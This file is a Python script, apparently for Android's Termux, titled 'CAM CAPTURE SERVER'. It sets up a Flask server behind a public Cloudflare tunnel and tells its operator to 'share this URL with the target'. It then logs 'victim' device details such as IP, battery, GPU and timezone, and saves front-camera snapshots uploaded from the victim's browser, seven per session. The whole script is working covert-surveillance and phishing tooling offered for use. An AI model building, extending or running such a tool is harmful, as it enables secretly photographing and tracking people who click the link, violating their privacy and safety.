#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
import importlib.util

os.system('clear')
PYTHON_PACKAGES = {
    "flask": "flask",
    "rich": "rich"
}
TERMUX_PACKAGES = [
    "python"
]
def auto_install():
    print("\n[•] Checking required packages...\n")
    if shutil.which("pkg"):
        for package in TERMUX_PACKAGES:
            result = subprocess.run(
                ["dpkg-query", "-W", "-f=${Status}", package],
                capture_output=True,
                text=True
            )

            if "install ok installed" not in result.stdout:
                print(f"[+] Installing Termux package: {package}")
                subprocess.run(
                    ["pkg", "install", "-y", package],
                    check=True
                )
    for module, package in PYTHON_PACKAGES.items():
        if importlib.util.find_spec(module) is None:
            print(f"[+] Installing Python package: {package}")

            subprocess.run(
                [
                    sys.executable, "-m", "pip",
                    "install", package
                ],
                check=True
            )
    print("\n[✓] All packages are ready!\n")
try:
    auto_install()
except subprocess.CalledProcessError as e:
    print(f"[!] Installation failed: {e}")
    sys.exit(1)

import re
import socket
import base64
import threading
import datetime
import logging

from flask import Flask, request, jsonify, send_from_directory
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

sys.stdout.write('\x1b]2;🔰 CAM SERVER\x07')


org = '\x1b[38;5;202m'
grn = '\033[32;1m'
red = '\033[31;1m'
A1  = '\033[1;31m'
A2  = '\033[1;32m'
A3  = '\033[1;33m'
A4  = '\033[1;34m'
A5  = '\033[1;35m'
A6  = '\033[1;36m'
A7  = '\033[1;37m'

A66 = '\x1b[1;92m\x1b[38;5;46m'
A77 = '\x1b[1;92m\x1b[38;5;47m'
A88 = '\x1b[1;92m\x1b[38;5;48m'
A99 = '\x1b[1;92m\x1b[38;5;49m'
A00 = '\x1b[1;92m\x1b[38;5;50m'

A11 = '\x1b[1;92m\x1b[38;5;208m'
A22 = '\x1b[1;92m\x1b[38;5;209m'
A33 = '\x1b[1;92m\x1b[38;5;210m'
A44 = '\x1b[1;92m\x1b[38;5;211m'
A55 = '\x1b[1;92m\x1b[38;5;212m'


def find_free_port():
    for p in range(5000, 5010):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", p))
            s.close()
            return p
        except OSError:
            continue
    return None


console    = Console()
PORT       = find_free_port()
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
IMAGES_DIR = "/storage/emulated/0/😩CAM_FUCK"
WEB_DIR    = os.path.join(BASE_DIR, "web")
os.makedirs(IMAGES_DIR, exist_ok=True)

app        = Flask(__name__, static_folder=WEB_DIR)
victim_log = []


LOGO = f'''
{A66}  █████▒█    ██  ▄████▄   ██ ▄█▀    ▄████▄   ▄▄▄       ███▄ ▄███▓
{A66}▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒    ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒
{A77}▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░    ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░
{A77}░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄    ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██
{A88}░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄   ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒
{A88} ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
{A99} ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░     ░  ▒     ▒   ▒▒ ░░  ░      ░
{A99} ░ ░    ░░░ ░ ░ ░        ░ ░░ ░    ░          ░   ▒   ░      ░
{A00}          ░     ░ ░      ░  ░      ░ ░            ░  ░       ░
{A00}                ░                  ░

{A11}            [ CAM CAPTURE SERVER ]  |  BY XALIF
       ─────────────────────────────────────────────
'''

about = (f'''{A2}

 ▄▄▄       ▄▄▄▄    ▒█████   █    ██ ▄▄▄█████▓
▒████▄    ▓█████▄ ▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒
▒██  ▀█▄  ▒██▒ ▄██▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░
░██▄▄▄▄██ ▒██░█▀  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ 
 ▓█   ▓██▒░▓█  ▀█▓░ ████▓▒░▒▒█████▓   ▒██▒ ░ 
 ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   
  ▒   ▒▒ ░▒░▒   ░   ░ ▒ ▒░ ░░▒░ ░ ░     ░    
  ░   ▒    ░    ░ ░ ░ ░ ▒   ░░░ ░ ░   ░      
      ░  ░ ░          ░ ░     ░              
                ░                            ''')


server = (f'''{A1}
⠀⠀⠀⠲⣦⣤⣀⣀⠀⠀⠀⣀⣀⣠⣤⣀⣀⠀⢀⣀⣠⣤⣶⣶⠟⠀⠀⠀
⠀⠀⠀⠀⠙⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠲⣶⣶⣾⣿⣿⠀⢨⠙⢿⣿⣿⠏⣅⠀⢸⣿⣿⣷⣾⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⢷⣶⣶⣾⣿⣿⣶⣶⣾⠟⣿⣿⣿⣋⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⠐⢶⣿⣿⣧⠁⠀⠋⠁⠈⠋⠀⢀⣾⣿⣿⡿⣷⣶⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣷⣤⣙⣿⣿⣷⣶⣶⣴⣴⣴⣶⣿⣿⣿⠟⣡⣿⣿⣧⣄⣀⡀
⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⡿⠿⣿⣿⣿⣿
⣿⡿⠛⠿⠟⠉⠉⠉⠸⠋⠀⠻⡿⣿⣿⣿⣿⠻⠇⠀⠀⠈⠀⠀⠈⠉⢸⠃
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⢿⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')


@app.route("/")
def index():
    return send_from_directory(WEB_DIR, "index.html")

@app.route("/pic.jpg")
def pic():
    return send_from_directory(WEB_DIR, "pic.jpg")


@app.route("/victim-info", methods=["POST"])
def victim_info():
    data      = request.get_json(silent=True) or {}
    ip        = data.get("ip",               request.remote_addr)
    ua        = data.get("userAgent",        "Unknown")
    platform  = data.get("platform",         "Unknown")
    battery   = data.get("batteryLevel",     "Unknown")
    charging  = data.get("batteryCharging",  "Unknown")
    tz        = data.get("timezone",         "Unknown")
    screen    = data.get("screenResolution", "Unknown")
    lang      = data.get("language",         "Unknown")
    net       = data.get("effectiveType",    "Unknown")
    device    = data.get("deviceType",       "Unknown")
    renderer  = data.get("renderer",         "Unknown")
    ts        = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
        "time": ts, "ip": ip, "platform": platform,
        "battery": battery, "timezone": tz,
        "screen": screen, "language": lang, "network": net,
        "userAgent": ua
    }
    victim_log.append(entry)

    tbl = Table(show_header=False, box=None, padding=(0, 1))
    tbl.add_column("key",   style="bold yellow", no_wrap=True)
    tbl.add_column("value", style="white")

    tbl.add_row("IP",        f"[bold red]{ip}[/bold red]")
    tbl.add_row("Device",    device)
    tbl.add_row("Platform",  platform)
    tbl.add_row("Battery",   f"{battery}  charging: {charging}")
    tbl.add_row("Timezone",  tz)
    tbl.add_row("Language",  lang)
    tbl.add_row("Screen",    screen)
    tbl.add_row("Network",   net)
    tbl.add_row("GPU",       renderer[:60])
    tbl.add_row("UserAgent", ua[:72] + ("..." if len(ua) > 72 else ""))

    console.print(Panel(
        tbl,
        title=f"[bold green][+] VICTIM CONNECTED  {ts}[/bold green]",
        border_style="green",
        box=box.ROUNDED,
        expand=False
    ))

    return jsonify({"status": "ok"})


@app.route("/upload-image", methods=["POST"])
def upload_image():
    data    = request.get_json(silent=True) or {}
    ip      = data.get("ip",    request.remote_addr)
    b64data = data.get("image", "")
    idx     = data.get("index", 0)

    if not b64data:
        return jsonify({"status": "error", "msg": "no image data"}), 400

    if "," in b64data:
        b64data = b64data.split(",", 1)[1]

    img_bytes = base64.b64decode(b64data)
    ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"{ip.replace('.', '_')}_{ts}_img{idx}.jpg"
    filepath  = os.path.join(IMAGES_DIR, filename)

    with open(filepath, "wb") as f:
        f.write(img_bytes)

    console.print(
        f"[bold cyan][[/bold cyan][bold green]CAM[/bold green][bold cyan]][/bold cyan] "
        f"[red]{ip}[/red]  cam hack  "
        f"[yellow]image {idx}[/yellow]  save → "
        f"[dim]images/{filename}[/dim]"
    )

    return jsonify({"status": "ok", "file": filename})


@app.route("/victims", methods=["GET"])
def victims():
    return jsonify(victim_log)


def start_cloudflare(port):
    proc = None
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        console.print(Panel(
            f"[cyan][*] Cloudflare tunnel starting...[/cyan]\n"
            f"[white]Forwarding: http://127.0.0.1:{port}[/white]\n"
            f"[yellow]Status: Connecting...[/yellow]",
            title="\n[bold magenta]TUNNEL[/bold magenta]",
            border_style="magenta",
            box=box.ROUNDED,
            expand=False
        ))

        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue

            match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
            if match:
                url = match.group(0)
                console.print(Panel(
                    f"[bold green]✓ Tunnel Active[/bold green]\n\n"
                    f"  [bold white]Public Link →[/bold white] "
                    f"[bold cyan]{url}[/bold cyan]\n\n"
                    f"  [dim]Share this URL with the target[/dim]",
                    title="[bold green]TUNNEL READY[/bold green]",
                    border_style="bright_green",
                    box=box.DOUBLE_EDGE,
                    expand=False
                ))

            elif "error" in line.lower() or "failed" in line.lower():
                console.print(Panel(
                    f"[red]{line}[/red]",
                    title="[bold red]TUNNEL ERROR[/bold red]",
                    border_style="red",
                    box=box.ROUNDED,
                    expand=False
                ))

    except FileNotFoundError:
        console.print(Panel(
            "[red]cloudflared not found.[/red]\n\n"
            "[yellow]Termux install:[/yellow]\n"
            "  [bold]pkg install cloudflared[/bold]\n\n"
            "[yellow]Or download binary:[/yellow]\n"
            "  [dim]https://github.com/cloudflare/cloudflared/releases[/dim]",
            title="[bold red]MISSING: cloudflared[/bold red]",
            border_style="red",
            box=box.ROUNDED,
            expand=False
        ))

    except Exception as e:
        console.print(f"[red][!] Tunnel exception: {e}[/red]")

    finally:
        if proc and proc.poll() is None:
            proc.terminate()


def start_flask(port):
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)


def menu():
    if PORT is None:
        console.print(Panel(
            "[bold red]5000-5009 All port Bisi Now![/bold red]\n"
            "[yellow]Sum process Return on[/yellow]",
            title="[bold red]PORT ERROR[/bold red]",
            border_style="red",
            box=box.ROUNDED,
            expand=False
        ))
        sys.exit(1)

    os.system("clear")
    print(LOGO, end="")

    console.print(Panel(
        f"[bold green]Local Server[/bold green]  →  [bold bright_cyan]http://127.0.0.1:{PORT}[/bold bright_cyan]\n"
        f"[dim]Auto-selected free port from 5000-5009[/dim]",
        border_style="dim",
        box=box.SIMPLE,
        expand=False
    ))

    print(f'''  {A1}⟨{A2}1{A1}⟩ {A3}Server Start
  {A1}⟨{A2}2{A1}⟩ {A3}About
  {A1}⟨{A2}3{A1}⟩ {A1}Exit''')

    while True:
        choice = input(f"\n{A3}﴾{A2}↳{A3}﴿ {A6}Select (1-3) {A1}➜ {A3}").strip()

        if choice == "1":
            os.system('clear')
            print(server)
            console.print(Panel(
                f"[green][*] Flask server starting on http://127.0.0.1:{PORT}[/green]\n"
                f"[cyan]Host   : 0.0.0.0  (LAN accessible)[/cyan]\n"
                f"[cyan]Port   : {PORT}[/cyan]\n"
                f"[cyan]Debug  : off[/cyan]\n"
                f"[yellow]Tunnel : Cloudflare (starting...)[/yellow]",
                title="[bold green]SERVER[/bold green]",
                border_style="green",
                box=box.ROUNDED,
                expand=False
            ))

            cf_thread = threading.Thread(
                target=start_cloudflare,
                args=(PORT,),
                daemon=True
            )
            cf_thread.start()

            fl_thread = threading.Thread(
                target=start_flask,
                args=(PORT,),
                daemon=True
            )
            fl_thread.start()

            try:
                fl_thread.join()
            except KeyboardInterrupt:
                console.print("\n[bold red][!] Server stopped.[/bold red]\n")
                sys.exit(0)

            break

        elif choice == "2":
            os.system('clear')
            print(about)
            console.print(Panel(
                "[bold white]CAM CAPTURE SERVER[/bold white]\n\n"
                "Flask + Cloudflare tunnel\n"
                "Victim device info  → terminal panel\n"
                "Front cam snapshots → images/\n"
                "7 photos per session\n\n"
                "[dim]by XALIF @#9002111185000#[/dim]",
                title="[bold blue]About[/bold blue]",
                border_style="blue",
                box=box.ROUNDED,
                expand=False
            ))
            console.input("\n  [dim]Press Enter to go back...[/dim]")
            return menu()

        elif choice == "3":
            console.print("\n[bold red][!] Exiting.[/bold red]\n")
            sys.exit(0)

        else:
            print(f"\n{A1}╰┈➤ [!] Invalid option")


if __name__ == "__main__":
    menu()
